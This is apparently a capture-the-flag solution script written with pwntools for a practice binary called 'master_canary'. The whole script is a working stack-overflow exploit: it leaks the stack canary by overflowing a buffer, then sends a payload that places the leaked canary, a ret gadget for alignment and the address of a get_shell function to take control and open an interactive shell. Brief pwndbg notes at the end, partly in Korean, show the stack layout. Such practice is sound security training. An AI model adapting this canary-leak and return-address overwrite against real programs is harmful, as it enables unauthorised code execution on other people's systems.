from pwn import *
context.log_level="debug"

p = process("./master_canary")
e = ELF("./master_canary")

get_shell = 0x400a4a
ret = 0x4007e1

def c1():
    p.sendlineafter(b"> ", b"1")
    
def c2(size, data):
    p.sendlineafter(b"> ", b"2")
    p.sendlineafter(b"Size: ", str(size).encode())
    p.sendafter(b"Data: ", data)
    p.recvuntil(b"Data: ")

def c3(comment):
    p.sendlineafter(b"> ", b"3")
    p.sendafter(b"Leave comment: ", comment)

c1()

# payload = b"A"*0x920 + p64(0x602800) + b"B"*16 + b"A"*0x9
payload = b"A"*0x939
c2(len(payload), payload)
p.recvuntil(payload)
canary = u64(p.recvn(7).rjust(8, b"\x00"))
print(hex(canary))

#stack alignment cracked... so, needed ret gadget(dummy)
payload2 = b"A"*(0x28) + p64(canary) + b"B"*0x8 + p64(ret) + p64(get_shell)
c3(payload2)

p.interactive()

# pwndbg> x/12gx $rbp-80
# 0x7fffffffdfc0: 0x0000000000000002      0x0000000000000006
# 0x7fffffffdfd0: 0x0000000000000000      0x0000000000000000
# 0x7fffffffdfe0: 0x0000000000000000      0x0000000000000000
# 0x7fffffffdff0: 0x0000000000000000      0x0000000000000000
# 0x7fffffffe000: 0x00007fffffffe0f0      0x9abac77d608a5300
# 0x7fffffffe010: 0x00007fffffffe0b0      0x00007ffff7dc91ca
# pwndbg> x/i 0x00007fffffffe0b0
#    0x7fffffffe0b0:      adc    cl,ah // 의미 없는 패딩
# pwndbg> x/i 0x00007ffff7dc91ca
#    0x7ffff7dc91ca <__libc_start_call_main+122>: mov    edi,eax //ret
